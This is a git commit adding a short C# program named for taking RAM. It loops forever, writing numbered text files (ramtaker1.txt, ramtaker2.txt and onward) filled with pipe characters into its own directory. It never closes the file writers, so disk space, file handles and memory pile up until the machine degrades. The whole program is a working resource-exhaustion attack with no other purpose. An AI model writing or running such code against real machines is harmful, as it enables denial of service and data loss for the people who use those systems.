203cc1429ce869272dfe83aac0e2ea1ed6c9d23b
Tumbleweed-64 <117474637+Tumbleweed-64@users.noreply.github.com>
2023-09-23 17:13:51 -0700

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,22 @@
+﻿class Program
+{
+    static void Main(String[] args)
+    {
+        // write loop to make ramtakern.txt files
+		string fileName = System.AppDomain.CurrentDomain.BaseDirectory;
+		int fileNum = 1;
+		fileName += "ramtaker1.txt";
+		string line = "||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||";
+		while (true)
+		{
+			StreamWriter writer = new StreamWriter(fileName);
+			for (int i = 0; i < 200; i++)
+			{
+				writer.WriteLine(line);
+			}
+			fileNum++;
+			fileName = System.AppDomain.CurrentDomain.BaseDirectory;
+			fileName += "ramtaker" + fileNum.ToString() + ".txt";
+		}
+    }
+}
